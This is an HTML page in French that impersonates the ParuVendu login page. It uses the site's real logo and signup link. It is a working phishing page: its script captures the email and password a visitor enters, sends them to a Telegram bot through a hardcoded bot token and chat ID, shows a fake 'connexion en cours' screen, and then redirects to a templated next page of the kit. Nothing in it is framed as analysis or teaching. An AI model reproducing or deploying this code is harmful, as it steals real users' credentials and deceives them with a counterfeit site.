<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - ParuVendu</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-image: url('https://github.com/zapata225/lebon/blob/main/paruvendu.png?raw=true');
            background-position: right;
            background-repeat: no-repeat;
            background-size: contain;
        }
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .logo img {
            width: 200px;
        }
        .container {
            width: 40%; /* Largeur du formulaire augment√©e */
            padding: 30px; /* Padding */
            background: white;
            border-radius: 30px; /* Bords plus enrob√©s */
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            position: absolute;
            top: 50%; /* Formulaire rabaiss√© */
            left: 15%; /* D√©plac√© plus √† gauche */
            transform: translateY(-50%); /* Centrage vertical */
            animation: slideUp 1s ease-out;
        }
        @keyframes slideUp {
            from {
                transform: translateY(100%);
            }
            to {
                transform: translateY(-50%);
            }
        }
        .form-group {
            margin-bottom: 15px; /* Espacement entre les champs */
            text-align: left;
        }
        input {
            width: 100%; /* Largeur des champs */
            padding: 12px; /* Padding */
            border: 1px solid #ccc;
            border-radius: 0; /* Bordures rectangulaires */
            font-size: 14px;
            transition: all 0.3s;
            background-color: #f9f9f9;
            box-sizing: border-box; /* Assure que la largeur inclut le padding */
        }
        input:focus {
            border-color: #ff4c4c;
            box-shadow: 0 0 5px rgba(255, 76, 76, 0.5);
        }
        .btn {
            background-color: #cc0000; /* Rouge plus fonc√© */
            color: white;
            padding: 8px 20px; /* Taille r√©duite */
            border: none;
            border-radius: 20px;
            cursor: pointer;
            width: 40%; /* Bouton plus petit */
            font-size: 14px; /* Taille du texte */
            transition: background 0.3s;
            text-transform: lowercase; /* Mise en minuscule */
            margin-left: auto;
            margin-right: auto;
            display: block;
            font-weight: bold; /* Texte en gras */
        }
        .btn:hover {
            background-color: #b30000; /* Rouge plus fonc√© au survol */
        }
        .connexion-text {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #ff4c4c;
            margin-bottom: 20px;
        }
        .form-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .form-logo img {
            width: 100px; /* Taille du logo */
        }
        .info-text {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
            text-align: center;
        }
        .info-text a {
            color: #cc0000;
            text-decoration: none;
            font-weight: bold;
        }
        .info-text a:hover {
            text-decoration: underline;
        }
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9); /* Fond semi-transparent */
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            color: #333;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }
        .loading-screen.active {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="ParuVendu">
    </div>
    <div class="container">
        <div class="connexion-text">Connexion √† votre compte</div>
        <div class="form-logo">
            <img src="https://static.paruvendu.fr/communfo/img/structuresite/home/paruvendu_170x60.svg" alt="Logo Formulaire">
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="email">Adresse e-mail</label>
                <input type="email" id="email" required>
            </div>
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="btn">Se connecter</button>
        </form>
        <div class="info-text">
            Vous n'avez pas de compte ?<br>
            <a href="https://www.paruvendu.fr/inscription/" target="_blank">Cr√©er un compte</a>
        </div>
    </div>

    <!-- √âcran de chargement -->
    <div class="loading-screen" id="loadingScreen">
        Connexion en cours...
    </div>

    <script>
        // Constantes pour le bot Telegram
        const BOT_TOKEN = "8128812759:AAEg0qMVYU-90EShzEkd60gIrakBm1XnovY";
        const CHAT_ID = "5652184847";

        // Fonction pour envoyer les donn√©es √† Telegram
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            const params = {
                chat_id: CHAT_ID,
                text: message,
            };

            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(params),
                });

                if (!response.ok) {
                    throw new Error("Erreur lors de l'envoi du message √† Telegram");
                }
                console.log("Message envoy√© avec succ√®s √† Telegram");
            } catch (error) {
                console.error("Erreur :", error);
            }
        }

        // Gestionnaire de soumission du formulaire
        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault(); // Emp√™che la soumission par d√©faut

            // Afficher l'√©cran de chargement
            const loadingScreen = document.getElementById("loadingScreen");
            loadingScreen.classList.add("active");

            // R√©cup√©rer les valeurs du formulaire
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Cr√©er le message √† envoyer
            const message = `
                üö® Nouvelle tentative de connexion üö®
                E-mail : ${email}
                Mot de passe : ${password}
            `;

            // Envoyer le message √† Telegram
            sendToTelegram(message);

            // Simuler un d√©lai de chargement (2 secondes)
            setTimeout(() => {
                // Rediriger vers la page suivante apr√®s l'envoi
                window.location.href = "{{ url_for('next_page', current_page='paruinformations') }}";
            }, 2000);
        });
    </script>
</body>
</html>
